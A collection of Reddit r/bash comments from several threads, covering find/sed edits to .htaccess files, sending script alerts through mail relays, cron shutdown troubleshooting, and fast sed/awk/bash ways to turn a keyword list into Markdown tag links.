ok so, doing 'echo **/.htaccess' in /home hangs like before, but doing it in the top level dir of a site returns all the .htaccess files for that site e.g. public_html/.htaccess public_html/_private/.htaccess public_html/_vti_bin/.htaccess the problem is that its returning every .htaccess file that it can find and I only one public_html/.htaccess and I guess this confirms why its just hanging when I run it in /home as its recursively finding them all. So how can I run this but specifically target ONLY the .htaccess files in /public_html? Also when I tried your second version it gives this: sed: -e expression #1, char 57: unterminated address regex sed: -e expression #1, char 57: unterminated address regex sed: -e expression #1, char 57: unterminated address regex sudo find . -type f -name '.htaccess' | while read -r file; do sed - i.bak -r '/&lt;IfModule mod_suphp\.c&gt;/,/&lt;\/IfModule&gt;/ s/^/#/; /&lt;Files "\.user\.ini"&gt;/,/&lt;\/Files&gt;/ s/^/#/' "$file"; done 
Well, the script already doing that but i don't need an email every 10min if it is not working, I wanna know and repeat but not every 10min that would flood the inbox.
Yeah "find" is pretty neat
I know nothing, just hang out here to hopefully soak some of it in, but I am good at details. The line `NOW=(date +%Y%m%d)` is the Y supposed to be capitalized? Does case even matter? Just something i noticed, good luck
You point your starting point for the search to that public_html location. With that `**` bash wildcard thingy, you do it like this: echo /path/to/public_html/**/.htaccess And with the find the starting location is that first parameter that's currently a `.` in the example. You change it to: find /path/to/public_html -type f -name '.htaccess' You can use relative paths, but that then depends on where you currently are when at the bash prompt so I can't really know what to do there. I think when you are in that top level directory of your site, you do this: public_html/**/.htaccess or find public_html -type f -name '.htaccess' About why the sed used in the 'find' + 'while read' thingy didn't work, I can't really see the mistake. It's hopefully just something about your copy and paste work in the terminal window, like an extra space somewhere or something like that.
Good eyes but this is normal :) Here are the two output loonatic@VostroLAMP ~ $ echo | date +%Y%m%d 20171205 loonatic@VostroLAMP ~ $ echo | date +%y%m%d 171205 From date --help %y last two digits of year (00..99) %Y year Happy learning :) 
Aha, thank you. Yes, learning does make me happy =)
&gt;I would think that 5 email max per day would be enough if the condition is met. &gt;My not so elegant way to approach this was to think about creating a mail.temp file, so when the email is sent it would check if that mail.temp file exist before sending a new email. And run another cronjob that delete the mail.temp file every 4.5h or so. That works for me. Your issue is how do you want to test the age of the mail.temp file? You could use `find -mmin` but keep in mind that that's the *modified* time i.e. 4.5 hours from the last time the file was modified. *Creation* time, on the other hand, is something that isn't exactly locked down in a standard way across the *nix world, but if you're using a file, then you can track the creation time using the file. So if modified time is ok with you, then just use `find` to manage that problem. If you want to use creation time instead, you could manually manage this using epoch time like so: tmpFile=/usr/local/syseneg/ic_core_p/pq_file_date.temp if [[ ! -f "${tmpFile}" ]]; then send e-mail date +%s &gt; "${tmpFile}" elif (( "$(date -d "270 minutes ago" +%s)" &gt; "$(&lt;${tmpFile})" )); then rm "${tmpFile:?}" fi 
That is awesome, that &gt; with the epoc time is a perfect way to time this whole thing. I would never have taught of that. Thanks a lot.
So why not use a ci tool like Jenkins to do all the heavy lifting? 
How were you able to configure the MTA? I've tried following multiple guides and reading the documentation to no avail. It always seizes up when trying to send an e-mail.
My choice would be sendmail. What sort of problems did you encounter when trying it? I used this frequently at work. If the sending machine is not on a registered domain, the upstream servers might not accept it.
that's like aksing how to configure a web server, (there are lots of ways) and i think google requires SPF or PTR records (DNS) to not go to junk mail. so why not use a relay? https://tecadmin.net/sendmail-to-relay-emails-through-gmail-stmp/# https://linuxconfig.org/configuring-gmail-as-sendmail-email-relay 
I use a command line mailer called 'email' on gentoo that allows you to set an external SMTP relay. You can send email like this "echo "Contents of message" | email -s "Subject" recipient@foo.org 
This is probably better serviced by /r/commandline
Forget sendmail. It's antiquated, and being replaced with postfix. Postfix is easy to configure. If you don't want to deal with any of that BS, you can solve your problem with a .mailrc in your home directory and use heirloom mail to send mail. A valid .mailrc might look something like this. set smtp-use-starttls set ssl-verify=ignore set smtp=smtp://smtp.office365.com:587 set smtp-auth=login set smtp-auth-user=$email_address set smtp-auth-password=$password set from="user_name@example.com (User Name)" set nss-config-dir=/etc/pki/nssdb You will need to validate the .mailrc options according to what your mail host requires, but the above will likely work with almost every major mail host. You will need to add the public IP address of the server you're sending from to your SPF records. If you do not, your public IP may be flagged for spam. SPF validation WILL fail, and most mail hosts will mark your messages as spam. There's more. If you have questions, let me know.
 x=abc while ((${#x} &lt; 10)); do x="${x}x" done printf '%s\n' "$x" # abcxxxxxxx
If you want to send email to a gmail.com address, you’ll probably need to set up a real MTA somewhere. You could connect to gmail directly from Bash and talk bare SMTP (`exec 3&lt;&gt;/dev/tcp/gmail-smtp-in.l.google.com/smtp`; `printf 'HELO example.com\r\n' &gt;&amp;3`; etc.), but I suspect gmail will flag that as spam pretty quickly. FWIW, I’ve had good success following [this guide](https://arstechnica.com/information-technology/2014/02/how-to-run-your-own-e-mail-server-with-your-own-domain-part-1/) for my own email setup.
I posted the question on SO and got this solution which worked in the end: find /home/*/public_html -name '.htaccess' -exec \ sed -i.bak '/&lt;IfModule mod_suphp\.c&gt;/,/&lt;\/IfModule&gt;/s/^/#/; /&lt;Files "\.user\.ini"&gt;/,/&lt;\/Files&gt;/s/^/#/' {} \ so I guess using -exec makes it faster? Or was the starting path that I was using before that was making it slow? Anyway, thanks for the help! 
The good util for this is [`grep(1)`](https://linux.die.net/man/1/grep)
`/usr/libexec/wifiFirmwareLoader -f | awk '{print $2}' | xargs -n1 basename`
 $ foo="RESOLVED /usr/share/wifi/firmware/6378JJUA3/hans.txcb" $ basename $(echo ${foo#RESOLVED}) hans.txcb Uses bash string manipulation to strip RESOLVED from string, and runs a basename on the results. If you'd loop this it would do what you want.
 $ cat file.txt RESOLVED /usr/share/wifi/firmware/6378JJU-A3/hans.trx RESOLVED /usr/share/wifi/firmware/6378JJU-A3/hans.txcb RESOLVED /usr/share/wifi/firmware/6378JJU-A3/hans.clmb RESOLVED /usr/share/wifi/firmware/6378JJU-A3/FIDNFNJ.txt $ cat file.txt | sed "s~\(.*/\)*\(.*\)$~\2~g" hans.trx hans.txcb hans.clmb FIDNFNJ.txt 
No, you can do it in grep, but it's a bit unintuitive, like: `grep -o '[^/]*$'`. Better in sed: `sed 's#.*/##'`.
&gt; unintuitive I'm much more comfortable with regex than awk/sed scripts myself, so it does make sense to me ;)
This won't work if any of the filenames contain a space. (Admittely, it doesn't look like any will contain a space, but one never knows.)
I like the sed solution. I also came up with easy awk version: $ awk -F/ '{print $NF}' file.txt hans.trx hans.txcb hans.clmb FIDNFNJ.txt and the less elegant multiple pipes with rev $ cat file.txt | rev | cut -d/ -f1| rev hans.trx hans.txcb hans.clmb FIDNFNJ.txt 
Ooh... your sed command is simpler and more elegant than mine....
Thanks, I'm going to give this a shot. It's been far more involved than I desired, so throwing away a large amount of server related bullshit sounds right up my alley.
Can you provide some clarification on how you’re running that command and where you’re seeing the error? And there’s some troubleshooting steps you might want to go through. - Are you just running that individual command in a Terminal, or is it part of a bigger bash script? - Does this command work on other versions of macOS? - Does this command only fail with the App Store, or does it fail with all apps you try? - Is that error message you’re getting the output to the Terminal after trying to run the command, or are you grabbing this from a log somewhere? - If you run the AppleScript portion directly in Script Editor, does it work? The AppleScript portion looks fine to me. If you’re running the osascript command without pointing to a file, I thought you needed the -e parameter. `osascript -e 'tell application “App Store” to activate'` If you run it without the -e, then you should get an error stating “No such file or directory”, so that’s why I ask how you’re running the command and where you’re actually seeing the error.
I think it's a fundamental misunderstanding of mine in regards to how this whole system works. I might be an SE but I deal primarily with motion control systems. Usually what happens is it validates everything and just as it attempts to send it hangs. I'm fairly certain it has to do with my email address.
Thanks for the reply. I wasn't worried about there being a second profile because in my case there is always going to be only one profile.
I’m running the command within terminal and the error output happens in terminal. I’m logged in as the current user (is part of the admin group). I also notice that if I run that command and open a non-native app, it works. If I try to open any apple app, it is then I receive that error. Also, I’ve always used the “-e” operator. :) I’m using MacOS 10.13. 
Add 77 dashes to the end of string: printf "string%77s\n" | tr ' ' '-';
[This guide](http://hacking.elboulangero.com/2017/07/04/debian-gmail.html) worked for me. Very quick to set up, maintained by adding user e-mails in `/etc/aliases/` as `username: email@address.com`, and then executed with i.e. `mail -s "subject" username` in command line/scripts.
Sounds good. Let me know how it goes. 
Won't work if string has space. Adding to this solution: str="Hello World" cols=$COLUMNS echo "$str $(printf "%$((cols-${#x}-1))s" '' | tr ' ' '-')"
More context please?
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
Not familiar with Mac, and this doens't solve your problem, but is the `logname` program available on a Mac? Also, if you are not using root, what happens if you try `echo ${USER}`? CurrentUser=$(logname) CurrentUser=$(echo ${USER}) Other than that, without access to your filesystem, I can't really know for sure what is wrong. What happens if you try quotes instead? ls "/Users/$CurrentUser/Library/Group Containers/UBF8T346G9.Office" file "/Users/$CurrentUser/Library/Group Containers/UBF8T346G9.Office/User Content" sudo rm -rf "/Users/$CurrentUser/Library/Group Containers/UBF8T346G9.Office/User Content/Startup/Word/linkCreation.dotm"
 #!/bin/bash readarray LINES &lt; $(/usr/libexec/wifiFirmwareLoader -f) for LINE in "${LINES[@]}"; do echo ${LINE##*/} done
Sure. In this case /usr/libexec/wifiFirmwareLoader -f | awk '{for (i=2; i&lt;=NF; i++) print $i}' | xargs -n1 basename But it is now too complicated in comparison with simple grep or sed...
`grep -E 'list|of|items'` is probably what you're after. Although having an example raw input and example desired output would be helpful...
That simple. I've just achieved what I was looking for straight away. I have never really used grep so this was amazing for me. Thank you.
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
So the first script works 100% as expected? What happens with the second version? Does the first button still work but not the second? Or does neither work? If you edit the script again and remove your additions, does it go back to working as it did? From what I can see, your changes look like they should work. If the firstt button works, but not the second, check your logs, double check the MAC address closely, maybe even try a version of the script that ONLY has the second button.
Both buttons quit working with the second script. After I removed the additions, the first button resumed working. I did test the URL associated with the wget command for the second button and it works. I'll try the other troubleshooting tips you suggest after work tonight. Thanks for the suggestions...I'm learning as I go here.
Think logically. Your second script expects the `NowLeasedMac` variable to have two different values simultaneously. How could that possibly work?
Thanks for the reply. I'm learning as I go. I thought that they were two mutually exclusive if/then blocks. E.g. it's not as if it was written as "if nowleasedmac==xxxx and nowleasedmac==yyyy". How would I rewrite it to make it work? If NowLeasedMac==xxx then Wget: http ... Else If NowLeasedMac==yyyy then Wget:http ... Gi fi
Actually it looks like I wasn't thinking clearly myself. Oops. I've edited my original reply. Yes, if those are meant to be two mutually exclusive if/then blocks, so as written, it should work. I don't know why it doens't. Check for typos? The shell does support an "else if" type construct using `elif`, which in this case should be equivalent: if [ "$NowLeasedMac" == "xx:xx:xx:xx:xx:xx" ]; then somecommands elif [ "$NowLeasedMac" == "Aa:Aa:Aa:Aa:Aa:Aa" ]; then someothercommands fi 
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
You can use the output of something by surrounding it with `$( )`: connections=$(netstat -an | grep -i 8080 | wc -l) You could do this to wait until there are no connections anymore: while (( $(netstat -an | grep -i 8080 | wc -l) &gt; 0 )); do sleep 1; done Or more wordy but with some output to be able to see what's currently happening: while true; do x=$(netstat -an | grep -i 8080 | wc -l); printf "\rConnections: %4d " "$x"; (( x == 0 )) &amp;&amp; break; sleep 1; done; printf "\n"
&gt; $(netstat -an | grep -i 8080 | wc -l) Thank you so much, this is great!
What does %4d do? after \rConnections
The `%4d` adds spaces to the number, depending on the length of it. It makes it so things look like this: Connections: 123 Connections: 7 Connections: 48 That `\r` code puts the cursor back to the front of the line to make the thing overwrite the same line repeatedly. I then used that `%4d` so that things get overwritten correctly with changing numbers.
Did the above with the if/then/elif/Fi back and it worked. The problem I was having before is that the letters in the MAC address have to be all lower case even though they are reported as caps.
So I got it working. Ended up the Mac address had to be all lower case despite it being reported by the dash button as all upper case!
Went with the if/then/elif block. The problem was I didn't have the Mac address as all lower case letters!
Are you relying on your path or any other environment variables in your script? When run by cron those things may not be defined. You can set those variables or usually full paths, etc
 #if all servers return 1 echo "NO VM IS ONLINE" &gt;&gt; $statuslog echo $hostname echo "SHUTTING DOWN SECONDARY HOST" &gt;&gt; $statuslog #ssh -t "${hosts[1]}" /home/admin/Desktop/SCRIPT_HELPER/shutdown.sh #echo "SHUTTING DOWN PRIMARYHOST" &gt;&gt; $statuslog sudo /sbin/shutdown -h now this actually my else part where it should shutdown. In my logs I can see, &gt;HOSTNAME &gt;NO VM IS ONLINE &gt;SHUTTING DOWN SECONDARY HOST &gt;SHUTTING DOWN PRIMARYHOST But It didn't shutdown. Except I run it manually. So the problem is /sbin/shutdown will not run in cron? SORRY FOR NEWBIE QUESTIONS!
I'd use the full path for ssh and sudo. If you want to see if the commands are running correctly do something like the following immediate after your commands: echo $? &gt;&gt; $statuslog You should see 0s of the commands succeeded I'm also assuming you can run sudo /sbin/shutdown without entering a password
Okay, I will check the commands if it's running correctly. Yup, you're correct. I can run it without entering the password. Thanks for your suggestions!
&gt; /home/admin/Desktop/SCRIPT_HELPER/shutdown.sh Is that file on every remote server or on the host doing the SSHing? I
Try editing in vim Type :r !env At the very top of your Cron tab This sets all your normal environment variables and will probably fix it
Maybe try [resetting OPTIND](https://unix.stackexchange.com/a/233737) at the top of your script. 
What is this black magic?
tl;dr; try this: sudo -n "/sbin/shutdown -h now" 2&gt;&amp;1 &gt;&gt; $statuslog Always use "sudo -n" in non-interactive scripts. This will ensure the script can actually run /sbin/shutdown in this situation, and and that the script isn't waiting (default timeout is 5 min) on the password prompt before failing. Also, make sure you are getting the full output of cron. By default cron emails any output. If you do not have both a) smtp set up correctly on the server and b) a valid destination email set up (best to set MAILTO=me@example.com at the top of your cron jobs), those mail messages will end up in limbo (usually a local mailbox that never gets checked) In this case, these messages will contain the output of the shutdown command, which presumably is failing. Just redirect all output to your log file and I think you'll find the problem. 
I found the answer I was missing the .localized see the updated script below. In case anyone else runs into the issue. #!/bin/sh CurrentUser=`/bin/ls -l /dev/console | /usr/bin/awk '{ print $3 }'` rm -rf "/Users/$CurrentUser/Library/Group Containers/UBF8T346G9.Office/User Content.localized/Startup.localized/Word/linkCreation.dotm" 
I did require the quotes but there was one other piece that I was missing. Thanks for your help!
Usually, escaping like you did is just fine, you just have to be careful. I prefer quoting to avoid the escapes if I can. What was the one other piece that was missing?
FYI, $() is preferred over ``. The backticks are perfectly fine, but using $() allow you nest commands more cleanly, and more obviously denote the beginning/end. CurrentUser=$(/bin/ls -l /dev/console | /usr/bin/awk '{ print $3 }') http://mywiki.wooledge.org/BashFAQ/082 ---- Also, is there a reason that you use 2 programs and a pipe to get the current user? Did neither of my suggestions above do what you need? Do you just prefer they way you had? CurrentUser=$(logname) CurrentUser=${USER}
Reading the output of the command env into the file
yea, fix your paths, cron runs as root and might have different paths than your account. look under your environment variablesand it should show you. Just include them on yours. Example SHELL=/bin/bash PATH = /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin........
It looks like your submission contains a shell script. To properly format it as code, place four space characters before every line of the script, and a blank line between the script and the rest of the text, like this: This is normal text. #!/bin/bash echo "This is code!" &gt; This is normal text. &gt; &gt; #!/bin/bash &gt; echo "This is code!" *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/bash) if you have any questions or concerns.*
It would help if you could show a sample of the contents of the file, as well as a sample of what the desired output is for that sample input.
Yes! **terms.txt** (those are keywords) John Doe Germany France **includeme.dict** (final dictionnary with urls and tags for Markdown) - John Doe [john-doe](/tags/) - Germany [Germany](/tags/germany) - France [France](/tags/france)
Yes some lines contains spaces (some of those are converted, for the url). WHat do you mean by how many lines? in Total, it's a huge file of like 5K keywords.
See if this is any faster #!/bin/bash IFS=$'\n' ( for line in `cat terms.txt`; do hugodelire=`echo $line | tr '[:upper:]' '[:lower:]' | tr " " "-" | sed "s/'//g"` echo "- ${line}" echo "[$line](/tags/${hugodelire})" done ) | tee include.dict 
Note: Either version will be faster if it omits printing the output to the terminal as it runs. To do that in my version replace ) | tee include.dict with ) &gt; include.dict 
Pipe the song path/name variable to 'basename'
FWIW, there is probably a massively faster way to do this using awk (aka gawk)
Would you mind expanding on what that would look like? I had help to get to this point, and i fully admit that this script is beyond my level of knowledge to begin with. I'm trying to understand/learn though. Thank you for your time. 
Try this, its a hundred times faster than mine: cat terms.txt | sed 's/^/- /g; p; s/^- //g; h; s~.*~[&amp;](/tags/&amp;)~g; s/(.*)/\L&amp;/g;' | sed ':l s/\(([^ )]*\)[ ]/\1/;tl' &gt; include.dict 
It goes down from 17s to 12s thanks a lot! and doesn't stress the hard drive that much compared to the other! I searched for the IFS=$'\n' part: I found this: https://stackoverflow.com/questions/4128235/what-is-the-exact-meaning-of-ifs-n#4128305 So it's to support linebreak (that bash doesnt support by default) ? i'm surprised because i tested your script while removing the line, and it still works, maybe it would make a difference if i saved the file in a windows environement? (i'm under linux).
haha i'm just seeing this, let's check, thanks :)
The IFS setting was to prevent it from breaking up lines with spaces. Without it, *John Doe* would become - John [John](/tags/john) - Doe [Doe](/tags/doe) 
&gt; O'Brother Oops.. forgot that.. one moment.. 
 cat terms.txt | sed 's/^/- /g; p; s/^- //g; s~.*~[&amp;](/tags/&amp;)~g; s/(.*)/\L&amp;/g;' | sed ':l s/\(([^ )]*\)[ ]/\1-/;tl' | sed ":l s/\(([^')]*\)[']/\1/;tl" &gt; include.dict
 $ cat terms.txt John Doe Germany France O'Hare Fred O'Malley $ cat terms.txt | sed 's/^/- /g; p; s/^- //g; s~.*~[&amp;](/tags/&amp;)~g; s/(.*)/\L&amp;/g;' | sed ':l s/\(([^ )]*\)[ ]/\1-/;tl' | sed ":l s/\(([^')]*\)[']/\1/;tl" &gt; include.dict $ cat include.dict - John Doe [John Doe](/tags/john-doe) - Germany [Germany](/tags/germany) - France [France](/tags/france) - O'Hare [O'Hare](/tags/ohare) - Fred O'Malley [Fred O'Malley](/tags/fred-omalley) 
It works! t-thanks m(_ _)m, this is a really high level of sed! The part really missing for me was the ;p; command you can add to restart another set of conversion, sed is way more complex that i first imagined!
sed is astonishingly complex, I've barely scratched the surface.
any special place for sed reference, or just standard googling?
 awk '{u=tolower($0); gsub("'\''", "", u); gsub(" ", "-", u); printf "- %s\n[%s](/tags/%s)\n", $0, $0, u}' ~/webstuff/terms.txt &gt; ~/webstuff/includeme.dict
I've reworked it so that its all one sed command now: cat terms.txt | sed "h; s/^/- /g; p; g; s/.*/[&amp;]/g; h; s/^\[//g; s/\]$//g; s/ /-/g; s/'//g; s/.*/(\/tags\/\L&amp;)/g; H; g; s/\n//g;" 
The sed version is more involved. sed -r "h;y/ /-/;s/'//g;s/.*/\L&amp;/;G;s#(.*)\n(.*)#- \2\n[\2](/tags/\1)#" ~/webstuff/terms.txt &gt; ~/webstuff/includeme.dict
just googling, together with *man sed*
Awk is the winner when it comes to speed.. This was on a file about 50k lines long: ------------------ AWK awk '{u=tolower($0); gsub("'\''", "", u); gsub(" ", "-", u); printf "- %s\n[%s](/tags/%s)\n", $0, $0, u}' terms.txt &gt; include.dict real 0.08 user 0.08 sys 0.00 ------------------ SED 1 cat terms.txt | sed "h; s/^/- /g; p; g; s/.*/[&amp;]/g; h; s/^\[//g; s/\]$//g; s/ /-/g; s/'//g; s/.*/(\/tags\/\L&amp;)/g; H; g; s/\n//g;" &gt; include.dict real 0.24 user 0.24 sys 0.00 ------------------ SED 2 sed -r "h;y/ /-/;s/'//g;s/.*/\L&amp;/;G;s#(.*)\n(.*)#- \2\n[\2](/tags/\1)#" terms.txt &gt; include.dict real 0.57 user 0.48 sys 0.00 
`sed` can run against a file directly, sparing you a [Useless Use of Cat](http://porkmail.org/era/unix/award.html) sed "sed stuff" filename And similarly of your earlier line: for line in `cat terms.txt`; do Backticks are archaic (superseded in '83 - use `$()` instead) and `bash` can read files directly with `&lt;` for line in $(&lt;terms.txt); do
Well my excuse is that **I** am archaic :)
And cats are NOT useless! They are furry and loving! https://www.google.com/search?q=cats&amp;tbm=isch 
http://www.grymoire.com/Unix/Sed.html
If you're using `bash` 4, you can save a bunch of calls to external progs like `tr` and `sed` and just transform your input natively, something like this: while read -r line; do lineTags="${line,,}" # Lowercases lineTags="${lineTags//\'/}" # Removes all instances of ' lineTags="${lineTags// /-}" # Replaces spaces with a dash printf '%s\n' "- ${line}" "[${line}](/tags/${lineTags})" done &lt; terms.txt &gt; include.dict I'm hoping that someone like /u/knowsbash will come along and tell me that hidden in the depths of `bash`'s code is a method to stack string transformations... something like this would be rather useful: lineTags="${line,,|//\'/|// /-}" If a `for` loop is more comfortable for you, then you could read `terms.txt` into an array and work your way through the array. It'd roughly look something like: mapfile -t termsArray &lt; terms.txt for line in "${termsArray[@]}"; do lineTags="${line,,}" # Lowercases lineTags="${lineTags//\'/}" # Removes all instances of ' lineTags="${lineTags// /-}" # Replaces spaces with a dash printf '%s\n' "- ${line}" "[${line}](/tags/${lineTags})" done &gt; include.dict `delete_old_files()` isn't required as `&gt; include.dict` (or `&gt; "${home}"/"${dict}"` for you) will either create and write to the file or overwrite it - the outcome is the same. And this is going to be expensive: echo "[$line](/tags/$hugodelire)"&gt;&gt;$home/$dict echo "[$line](/tags/$hugodelire)" Because it's working in a loop. I've ignored the requirement of the second `echo`, because the fastest thing to do if you want the file's contents is to `cat` it at the end of your processing - again, the outcome is the same.
Late to the thread, but you could actually use curl to send via gmail, if you're ok with sending from a gmail address. It's even easy, like this: echo -e "\ From: sender@gmail.com To: recipient@gmail.com Subject: OH MY GOD WE'RE ALL DOOMED!!! The projects... They're gone. ALL of them..." | \ curl -s -n --ssl-reqd \ --url "smtps://smtp.gmail.com:465" \ -u "sender@gmail.com:password" \ --mail-from "sender@gmail.com" \ --mail-rcpt "recipient@gmail.com" -T - 
Your script looks for "kbps" in the output of `file`. `file` shows that for mp3, but not for flac. If you give us a list of tools you want to use to determine bitrate for each file type and example output, we can help. Here's a flac example: $ soxi -B a.flac 991k A script could read your entire music library and list files with low bitrate without your having to start listening to each one.
Wow, I've got to try that! I think I've made some progress with the project, but now I've got to work with IT to ensure that they're not shutting down my attempts at sending automated emails. Thank you for your suggestion!
Thanks for spelling that out for me. I had a hunch that i would not be able to get the bit rate of flac without using a separate tool, but just wanted to be sure it wasnt a formating issue, or something obvious i was missing. I hear you on having a script just output the bit rate of my entire library, which is probably the more logical approach. But i like the idea of being able to run a single command and get the bit rate of any song/codec at my will while using Lollypop. Which I just settled on after years of using foobar, than mpd + ncmpcpp. Lollypop hits on all that is important for me, though it lacks anyway to quickly view metadata, other than launching easytag. The developer of lollypop will not be adding anything like that, So i was looking at a script as kind of an extension for a feature that i've grown used to, quickly viewing codec/bitrate/sample rate. I just want something that could detect the song that is currently active in lollypop (maybe via mpris?) and output something like: Current bit/sample rate: 320kbps/44100Hz Forwarding a notification is not a must have, viewing output in the terminal is all good. I also have a lot of 24bit/192000khz recordings that i intend to down sample over time. And my thinking is it would just be handy to get that info on whatever im listening to easily on the fly. A bash script sounded like a good idea. But maybe i bit off more than i can chew. haha. I was looking at tinytag: https://github.com/devsnd/tinytag It appears capable of fetching all the info i want, from flac,mp3 &amp; m4a, which are the three codecs i care about. Idea being figure out how to get tinytag to fetch the requested metadata from the currently playing song and output in terminal or via notify-send. I am definitely open to suggestions on better tools/approach for the end goal. Thanks for all the info and help. 
Looks like mediainfo is good enough. Replace bitrate="$(file "$path"|sed 's/.*, \(.*\)kbps.*/\1/')" with bitrate=$(($(mediainfo --Inform="Audio;%BitRate%" "$f") / 1000)) The rest of the script doesn't look great. If you can provide an example of what gets stored in `$metadata` it should be easy to improve it.
Hmmm. It seems for me when replacing that line it still outputs the path to song, so the actual bit rate is not visible, as seen in this screenshot: https://imgur.com/a/J6Q1J And when you say the rest of the script doesnt look great, do you just mean sloppy code etc? Apologies for the newb question. 
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/ABYPjnR.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) 
I used `$f` instead of `$path`. I edited my comment to use the same variable name you did. Yeah, it's sloppy code. Can you paste the output of dbus-send --print-reply --type=method_call --dest='org.gnome.Lollypop' /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:'org.mpris.MediaPlayer2.Player' string:'Metadata' while a song is playing?
Okay. The output makes it look like the Bitrate information is not a accepting variable. uhg. https://imgur.com/a/q6OzM The information here makes it sound like extracting the information i want is much easier with mpris1 rather than mpris2. Under the Title "what song is playing now" https://github.com/clementine-player/Clementine/wiki/Controlling-Clementine-from-the-commandline-with-DBus-and-MPRIS Better yet, this tool may make it extremely simple. Experimenting with it now, but having trouble getting it to show the bitrate info, only been playing with it for 5 min though. https://github.com/mariusor/mpris-ctl 
^(Hi, I'm a bot for linking direct images of albums with only 1 image) **https://i.imgur.com/QZA2q9x.png** ^^[Source](https://github.com/AUTplayed/imguralbumbot) ^^| ^^[Why?](https://github.com/AUTplayed/imguralbumbot/blob/master/README.md) ^^| ^^[Creator](https://np.reddit.com/user/AUTplayed/) ^^| ^^[ignoreme](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=ignoreme&amp;message=ignoreme) ^^| ^^[deletthis](https://np.reddit.com/message/compose/?to=imguralbumbot&amp;subject=delet%20this&amp;message=delet%20this%20dr0u5k1) 
 while read T; do t=${T/ /-}; t=${t,,}; echo -e "- $T\n[$T](/tags/$t)" &gt;&gt; includeme.dict; done &lt; terms.txt
A similar solution with pure bash create_dic() { while read T; do t=${T/ /-}; t=${t,,}; echo -e "- $T\n[$T](/tags/$t)"; done; } 
Curious to see how the bash solution stacks up on your machine. It's coming in at 0.75s on mine. create_dic() { while read T; do t=${T/ /-}; t=${t,,}; echo -e "- $T\n[$T](/tags/$t)"; done; } $ for i in {0..5000}; do echo 'John Doe' &gt;&gt; terms.txt; done $ wc -l terms.txt 5001 terms.txt $ time create_dic &lt; terms.txt &gt; includeme.dict real 0m0.075s user 0m0.062s sys 0m0.012s 
Run this from a terminal while a song is playing. It should output the bitrate. f=$( dbus-send --print-reply --type=method_call --dest=org.gnome.Lollypop /org/mpris/MediaPlayer2 org.freedesktop.DBus.Properties.Get string:org.mpris.MediaPlayer2.Player string:Metadata | sed -rn '/string "xesam:url"/{n;s#.*"file://(.*)"#\1#;s/%/\\x/g;p}' | tr '\n' '\0' | xargs -r0 echo -e ) echo $(($(mediainfo --Inform="Audio;%BitRate%" "$f") / 1000)) If it doesn't work, tell me what `$f` is.
Ran in from the term and it works perfectly :) looking at the code I would have never, ever, gotten that far so your time is extremely appreciated. 
Which part does the case conversion?
&gt; t=${t,,} That lowercases everything. `t=${t^^}` would uppercase it. Requires `bash` 4
The ,, variable expansion. ^^ capitalizes
I hadn’t read your comment prior to commenting, if that’s what you were implying. 
 echo $* | mail -s "$subject" someone@gmail.com Install ssmtp and mailutils edit the /etc/ssmtp/ssmtp.conf file as follows ######################################## mailhub=smtp.gmail.com:587 AuthUser=your@gmail.com AuthPass=your_mail_password UseTLS=YES UseSTARTTLS=YES ######################################## Now i can send mail from the terminal itself using the mail command. subject=$(date | sed 's/ /_/g') echo message | mail -s "subject" recipient@gmail.com 
Thanks for the awk version, there is just one thing i don't get with: 
thanks! i find awk easier to read :) haha i'll try both
awk doesn't have interpolated strings. You could concatenate strings: print "- " $0 "\n[" $0 "](/tags/" u ")\n"
Sadly, there is no way to stack parameter expansions.
i noticed that in order to be able to use the special character ' you must precede it a \ but also wrap it with two other ' ? this is wierd oO i tested without those two ' but it gives an error.
Backslash escapes aren't recognized inside of single quoted strings, so if you want a literal single quote, you end the string (tick one), add an escaped one (backslash and tick two), and then start a new string (tick three). 'a' &amp;nbsp; \' &amp;nbsp; 'b'
Debug with MAILTO variable at first line of cron job like this MAILTO=your@mail.com every time you will be recieve email with stderr and stdout of yr script
I don't have a solution or anything definitive but I'm guessing the users double hop via SSH, I presume the VPS will accept SSH keys of users to the initial box and redirect to the VPS. I reckon keys rather than passwords will make the second jump much more seamless. Would some sort of load balancer help like haproxy or equivalent to distribute incoming connections to lesser loaded virtual systems? If the point of this is to distribute load, would it make more sense to make a cluster of the VPS systems and treat them as one entity? A docker swarm perhaps might do perhaps. 
remove not (test first): &gt; $ rm !(*20171101|*.gz) For more dynamic time based removal you should echo the file's timestamp into a variable and apply the logic to that.
remove not (test first): &gt; $ rm !(*20171101|*.gz) For more dynamic time based removal you should echo the file's timestamp into a variable and apply the logic to that.
Yes that is all correct. Sorry, should've clarified. Also thank you! This might be what I'm looking for.
